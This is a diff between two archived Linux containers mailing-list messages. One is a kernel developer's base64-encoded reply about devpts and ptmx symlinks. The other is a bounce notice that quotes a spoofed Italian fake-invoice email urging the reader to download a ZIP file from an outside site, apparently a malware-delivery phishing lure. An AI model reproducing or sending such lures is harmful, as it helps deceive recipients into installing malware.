@@ -1,23 +1,10 @@
-From: Kay Sievers <kay.sievers-tD+1rO4QERM@public.gmane.org>
-Subject: Re: [RFC] fix devpts mount behavior
-Date: Sat, 28 Jan 2012 22:32:06 +0100
-Message-ID: <CAPXgP12hk4iQNYGVrcKG1xBEJ2TmCH8jDx-E+1a8Mw8wiWCeDA@mail.gmail.com>
-References: <20120124000517.GA28878@sergelap>
-	<CA+55aFz9ofF+Ey8VCDS8UEf2XSw36kj2RhkHfFScuzLXMeNrkA@mail.gmail.com>
-	<20120124002555.GA29534@sergelap>
-	<CA+55aFzwOU137V6wtyBjessx05NJo2G4KV0rvTKWvC79A+o9iQ@mail.gmail.com>
-	<20120124010758.GJ23916@ZenIV.linux.org.uk>
-	<m1k44gj1cu.fsf@fess.ebiederm.org>
-	<20120124220247.GA26353@hallyn.com>
-	<CAPXgP13_gczQmG_USAp0p2AuTfxkzAvzHvjbZY_rbbLH-4rDyg@mail.gmail.com>
-	<20120124231601.GA4470@sergelap>
-	<CAPXgP12REAwmDORzdGJhsxZKU8nhiauCxoVdKa8Eifw4MWWtgA@mail.gmail.com>
-	<20120128195103.GA11299@sergelap> <m139azpn2n.fsf@fess.ebiederm.org>
+From: Mail Delivery Subsystem <MAILER-DAEMON-SlFxh4Pscmu8/LWd1FLu5j4xb7Bw8egA@public.gmane.org>
+Subject: Returned mail: see transcript for details
+Date: Sun, 29 Jan 2012 12:18:53 +0900
+Message-ID: <201201290318.q0T3IrhL018164@mail.neighbor21.co.kr>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: multipart/mixed; boundary="===============8825666167301551965=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <m139azpn2n.fsf-+imSwln9KH6u2/kzUuoCbdi2O/JbrIOy@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -27,33 +14,91 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: "Eric W. Biederman" <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>
-Cc: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, Dave Hansen <haveblue-r/Jw6+rmf7HQT0dZR+AlfA@public.gmane.org>, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Al Viro <viro-RmSDqhL/yNMiFSDQTTA3OLVCufUGDwFn@public.gmane.org>, Andy Whitcroft <apw-Z7WLFzj8eWMS+FvcfC7Uqw@public.gmane.org>, sukadev-23VcF4HTsmIX0ybBhKVfKdBPR1lH4CV8@public.gmane.org, Linus Torvalds <torvalds-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-T24gU2F0LCBKYW4gMjgsIDIwMTIgYXQgMjE6NTIsIEVyaWMgVy4gQmllZGVybWFuIDxlYmllZGVy
-bUB4bWlzc2lvbi5jb20+IHdyb3RlOgo+IFNlcmdlIEhhbGx5biA8c2VyZ2UuaGFsbHluQGNhbm9u
-aWNhbC5jb20+IHdyaXRlczoKPgo+PiBRdW90aW5nIEtheSBTaWV2ZXJzIChrYXkuc2lldmVyc0B2
-cmZ5Lm9yZyk6Cj4+PiBXZSBtaWdodCBhbHNvIHRoaW5nIGFib3V0IGNoYW5naW5nIC9zeXMvY2xh
-c3MvdHR5L3B0bXgvLCBhbmQgaGF2ZSB0aGUKPj4+IGtlcm5lbCBjcmVhdGUgdGhlIHN5bWxpbms/
-IFRoZSBsb29wcyB0aHJvdWdoIHVzZXJzcGFjZSB0byBzZXR1cAo+Pj4gZGVmYXVsdCBrZXJuZWwg
-c3R1ZmYgYXJlIGtpbmQgb2YgY3JhenkgLi4uCgo+PiBzb3JyeSwgdGhlcmUgaXMgc29tZXRoaW5n
-IEknbSBtaXNzaW5nIGhlcmUuIMKgV2l0aG91dCBhIHRhcmdldCBrb2JqCj4+IHRvIGxpbmsgdG8s
-IGhvdyB3b3VsZCB3ZSBnbyBhYm91dCB0ZWxsaW5nIHRoZSBrZXJuZWwgdGhhdCAvZGV2L3B0bXgK
-Pj4gc2hvdWxkIGJlIGEgc3ltbGluayB0byAvZGV2L3B0cy9wdG14PyDCoElzIHRoZXJlIGEgd2F5
-IHRvIGRvIHRoYXQ/CgpUaGVyZSBpcyBubyBzdXBwb3J0IGZvciBzeW1saW5rcyBpbiB0aGUgY29y
-ZSBhdCB0aGUgbW9tZW50LiBCdXQgSQpndWVzcyB3ZSBjb3VsZCBqdXN0IGFkZCBzdXBwb3J0IGZv
-ciBpdCB0byB0aGUgZHJpdmVyIGNvcmUgYW5kIGRldnRtcGZzCnRvIGNyZWF0ZSBhIHN5bWxpbmsg
-aW4gL2RldiBpbnN0ZWFkIG9mIGEgZGV2aWNlIG5vZGUuCgpUaGUgcHRteCBkZXZpY2Ugd291bGQg
-bmVlZCB0byBwYXNzIHRoYXQgaW5mb3JtYXRpb24gYWxvbmcgdG8gdGhlCmRyaXZlciBjb3JlIGNh
-bGwgd2hlbiBjcmVhdGluZyB0aGUgcHRteCBkZXZpY2UuCgo+IFRoZXJlIGlzIHByZWNlZGVudCBp
-biB0aGUgL2Rldi9mZCBzeW1saW5rcywgc28gSSBleHBlY3QgeW91IHdhbnQKPiB0byBsb29rIGFu
-ZCBzZWUgd2hlcmUgdGhlIGNvbmZpZ3VyYXRpb24gZm9yIHRoYXQgY29tZXMgZnJvbS4KClRoYXQn
-cyBhIHN0YXRpYyBsaXN0IG9mIHN0dWZmIGNyZWF0ZWQgYXQgc3RhcnR1cC4gQnV0IGl0J3MgZWFz
-aWVyIHRvCmRvIGluIHVzZXJzYWNlLCBiZWNhdXNlIC9wcm9jIGlzIG5vdCBjb25maWd1cmFibGUg
-b3Igb3B0aW9uYWwgZm9yCnVzdWFsIHVzZSBjYXNlcywgc28gd2UgY2FuIGp1c3QgZG8gaXQgdW5j
-b25kaXRpb25hbGx5IGluIHVzZXJzcGFjZS4KVGhleSBhbHNvIGNhbiBub3QgY29uZmxpY3Qgd2l0
-aCBkZXZpY2Ugbm9kZXMuCgpLYXkKX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX18KQ29udGFpbmVycyBtYWlsaW5nIGxpc3QKQ29udGFpbmVyc0BsaXN0cy5saW51
-eC1mb3VuZGF0aW9uLm9yZwpodHRwczovL2xpc3RzLmxpbnV4Zm91bmRhdGlvbi5vcmcvbWFpbG1h
-bi9saXN0aW5mby9jb250YWluZXJz
+This is a MIME-encapsulated message
+
+--===============8825666167301551965==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="q0T3IrhL018164.1327807133/mail.neighbor21.co.kr"
+
+This is a MIME-encapsulated message
+
+--q0T3IrhL018164.1327807133/mail.neighbor21.co.kr
+
+The original message was received at Sun, 29 Jan 2012 12:18:47 +0900
+from mail1.unnes.ac.id [118.97.9.60] (may be forged)
+
+   ----- The following addresses had permanent fatal errors -----
+<ymarco-IWqWACnzNjyonA0d6jMUrA@public.gmane.org>
+    (reason: 550 5.1.0 <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org> SPF Failed - not authorized)
+
+   ----- Transcript of session follows -----
+... while talking to imp-1.mail.tiscali.it.:
+>>> MAIL From:<containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org> SIZE=954
+<<< 550 5.1.0 <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org> SPF Failed - not authorized
+554 5.0.0 Service unavailable
+
+--q0T3IrhL018164.1327807133/mail.neighbor21.co.kr
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; mail.neighbor21.co.kr
+Received-From-MTA: DNS; mail1.unnes.ac.id
+Arrival-Date: Sun, 29 Jan 2012 12:18:47 +0900
+
+Final-Recipient: RFC822; ymarco-IWqWACnzNjyonA0d6jMUrA@public.gmane.org
+Action: failed
+Status: 5.1.0
+Diagnostic-Code: SMTP; 550 5.1.0 <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org> SPF Failed - not authorized
+Last-Attempt-Date: Sun, 29 Jan 2012 12:18:52 +0900
+
+--q0T3IrhL018164.1327807133/mail.neighbor21.co.kr
+Content-Type: message/rfc822
+
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from mail1.unnes.ac.id (mail1.unnes.ac.id [118.97.9.60] (may be forged))
+	(authenticated bits=0)
+	by mail.neighbor21.co.kr (8.14.2/8.14.2) with ESMTP id q0T3IkhL018162
+	for <ymarco-IWqWACnzNjyonA0d6jMUrA@public.gmane.org>; Sun, 29 Jan 2012 12:18:47 +0900
+Received: from [118.97.9.60] by mail1.unnes.ac.id id 292g5yflBjdp with SMTP; Sun, 29 Jan 2012 10:28:30 +0700
+Date: Sun, 29 Jan 2012 10:28:30 +0700
+From: "inform" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.1.61.8) Personal
+X-Priority: 3 (Normal)
+Message-ID: <17899245.80691662620806-/dYPggjBmVk7HLB1kJ91c2CgeU+1il2p@public.gmane.org>
+To: <ymarco-IWqWACnzNjyonA0d6jMUrA@public.gmane.org>
+Subject: Fattura N 8084896586
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+
+                   =20
+Gentile cliente.
+
+
+Ti mando una fattura.
+Ruegeo Le pagato entro la fine di questo mese.
+
+Dettagli possono essere trovati sul sito web
+http://www.hazelhc.com/debitodownload/informazioni.zip?idown039009Usera=3D=
+ymarco
+
+
+
+
+--q0T3IrhL018164.1327807133/mail.neighbor21.co.kr--
+
+
+--===============8825666167301551965==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============8825666167301551965==--
